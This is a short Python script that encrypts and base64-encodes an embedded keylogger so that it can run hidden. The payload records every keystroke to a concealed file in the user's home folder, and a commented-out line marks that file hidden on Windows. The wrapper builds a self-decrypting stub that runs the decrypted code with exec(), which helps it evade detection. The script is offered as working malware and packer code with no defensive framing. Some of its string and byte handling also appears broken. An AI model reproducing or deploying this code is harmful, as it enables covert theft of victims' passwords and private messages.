import base64
from cryptography.fernet import Fernet

#Into payload copy the python file's content (e.g. keylogger-usage.pyw)
payload = """
from pynput.keyboard import Key, Listener
import logging
from os.path import expanduser
import subprocess
home = expanduser("~")

filepath = home + "/.tmp3453.bin"
logging.basicConfig(filename=filepath, level=logging.DEBUG, format='%(asctime)s: %(message)s')
#subprocess.check_call(["attrib","+H",filepath])

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
"""

def encrypt(payload):
    key = Fernet.generate_key()
    f = Fernet(key)
    token = f.encrypt(payload)
    #encodedBytes = f.decrypt(token)
    return (token,key)

if __name__ == "__main__":

    # Encrypt payload
    (enc_payload,key) = encrypt(payload)

    # Create executable string for payload decryptor
    payload_with_decryptor = "key = '" + key + "'\nepl = '" + enc_payload + "'\n" + """from cryptography.fernet import Fernet\nf = Fernet(key)\nc = f.decrypt(epl)\nexec(c)"""

    # Base64 everything
    encodedBytes = base64.b64encode(payload_with_decryptor.encode("UTF-8"))
    print("Encrypt-Encoded Payload:")
    print(encodedBytes)
    #print("Key:")
    #print(key)
    

    
    